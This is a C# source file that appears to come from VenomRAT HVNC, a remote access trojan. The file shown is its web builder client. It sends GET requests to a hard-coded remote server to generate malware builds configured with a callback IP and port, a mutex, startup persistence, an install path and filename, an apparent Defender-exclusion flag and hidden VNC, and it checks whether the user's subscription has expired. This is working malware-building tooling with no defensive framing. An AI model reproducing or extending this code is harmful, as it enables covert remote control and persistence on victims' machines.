using System.IO;
using System.Net;

namespace VenomRAT_HVNC.HVNC.WebBuilder
{
    internal class WebBuilder
    {
        public static string Server = "http://91.134.207.23:5337/venom/index.php";

        public static string Username;

        public static string DownloadURL = "http://91.134.207.23:5337/venom/";

        public static string SendBuild(string ip, string port, string id, string mutex, string startup, string path, string folder, string filename, string wdex, string hhvnc)
        {
            try
            {
                string requestUriString = Server + "?user=" + Username + "&action=build&ip=" + ip + "&port=" + port + "&id=" + id + "&mutex=" + mutex + "&startup=" + startup + "&path=" + path + "&folder=" + folder + "&filename=" + filename + "&wdex=" + wdex + "&hhvnc=" + hhvnc;
                WebRequest webRequest = WebRequest.Create(requestUriString);
                webRequest.Method = "GET";
                WebResponse response = webRequest.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader streamReader = new StreamReader(responseStream);
                string text = streamReader.ReadToEnd();
                if (text.Contains("Build Completed"))
                {
                    return "success";
                }
                if (text.Contains("Invalid Arguments"))
                {
                    return "invalid-arguments";
                }
                if (text.Contains("missing-args"))
                {
                    return "missing-args";
                }
                if (text.Contains("User Not-Found OR Expired!"))
                {
                    return "invalid-user-or-expired";
                }
                return "false";
            }
            catch (WebException)
            {
                return "error";
            }
        }

        public static string DeleteOldBuild()
        {
            try
            {
                string requestUriString = Server + "?user=" + Username + "&action=delete";
                WebRequest webRequest = WebRequest.Create(requestUriString);
                webRequest.Method = "GET";
                WebResponse response = webRequest.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader streamReader = new StreamReader(responseStream);
                string text = streamReader.ReadToEnd();
                if (text.Contains("deleted"))
                {
                    return "success";
                }
                return "false";
            }
            catch (WebException)
            {
                return "error";
            }
        }

        public static string IsBuilderAlive()
        {
            try
            {
                string requestUriString = Server + "?user=" + Username + "&action=alive";
                WebRequest webRequest = WebRequest.Create(requestUriString);
                webRequest.Method = "GET";
                WebResponse response = webRequest.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader streamReader = new StreamReader(responseStream);
                string text = streamReader.ReadToEnd();
                if (text.Contains("alive"))
                {
                    return "alive";
                }
                return "false";
            }
            catch (WebException)
            {
                return "error";
            }
        }
    }
}